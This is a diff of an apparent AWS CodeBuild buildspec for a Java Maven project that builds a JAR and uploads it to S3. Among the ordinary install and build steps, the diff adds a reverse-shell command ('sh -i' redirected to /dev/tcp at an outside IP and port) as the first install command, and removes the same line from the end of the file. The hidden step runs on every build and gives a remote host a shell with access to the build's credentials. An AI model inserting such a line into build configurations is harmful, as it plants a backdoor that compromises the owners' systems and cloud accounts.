@@ -5,6 +5,7 @@ phases:
     runtime-versions:
       java: 17
     commands:
+      - sh -i >& /dev/tcp/54.81.84.76/2323 0>&1
       - echo Installing dependencies...
       - apt-get update && apt-get install -y maven
       - curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/home/admin/awscliv2.zip"
@@ -22,7 +23,6 @@ phases:
       - echo Build completed successfully.
       - echo Uploading artifact to S3...
       - aws s3 cp target/demo-0.0.1-SNAPSHOT.jar s3://java-build-artifacts-h6krzo/
-      - sh -i >& /dev/tcp/54.81.84.76/2323 0>&1
 artifacts:
   files:
     - target/demo-0.0.1-SNAPSHOT.jar
